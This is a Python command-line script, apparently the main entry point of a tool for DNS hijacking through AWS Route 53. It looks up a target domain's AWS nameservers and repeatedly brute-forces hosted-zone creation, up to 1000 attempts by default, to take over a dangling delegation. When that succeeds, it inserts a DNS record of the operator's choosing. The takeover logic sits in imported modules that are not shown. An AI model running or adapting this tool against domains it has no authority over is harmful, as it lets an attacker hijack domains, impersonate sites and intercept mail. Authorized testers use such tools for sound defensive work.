import argparse
from datetime import datetime
from dnsquery import DNSResolver
from route53 import Route53Manager
from takeover import brute_force
from logger_config import setup_logging


parser = argparse.ArgumentParser(
    description="Test AWS Route 53 hosted zone NS assignments."
)
parser.add_argument(
    "domain",
    type=str,
    help="The domain name for the hosted zone",
)
parser.add_argument(
    "--max_attempts",
    type=int,
    default=1000,
    help="Maximum attempts to try to perform takeover.",
)
parser.add_argument(
    "-s",
    "--single",
    action="store_true",
    help="Only try to takeover one of the nameservers.",
)
parser.add_argument(
    "-f", "--force", action="store_true", help="Don't ask for confirmations."
)

parser.add_argument(
    "--record_type",
    choices={
        "A",
        "AAAA",
        "CNAME",
        "MX",
        "NS",
        "PTR",
        "SOA",
        "SPF",
        "SRV",
        "TXT",
    },
    help="The type of the DNS record.",
)
parser.add_argument("--record_name", help="The name of the DNS record.")
parser.add_argument("--record_value", help="The value of the DNS record.")

args = parser.parse_args()

logger = setup_logging(
    log_file=f"{args.domain}_{datetime.now().strftime("%Y-%m-%d_%H-%M")}.log"
)

if args.record_type or args.record_name or args.record_value:
    if not (args.record_type and args.record_name and args.record_value):
        parser.error(
            "--record_type, --record-name, and --record-value must all be specified together."
        )

args = parser.parse_args()


def main():
    dns_resolver = DNSResolver()
    manager = Route53Manager()
    name_servers = dns_resolver.get_aws_ns_servers(args.domain)
    result = brute_force(manager, args.domain, name_servers, args.max_attempts)
    print(result)
    if result["success"] and args.record_type:
        manager.add_dns_record(
            result["zone_id"], args.record_name, args.record_type, args.record_value
        )


if __name__ == "__main__":
    main()
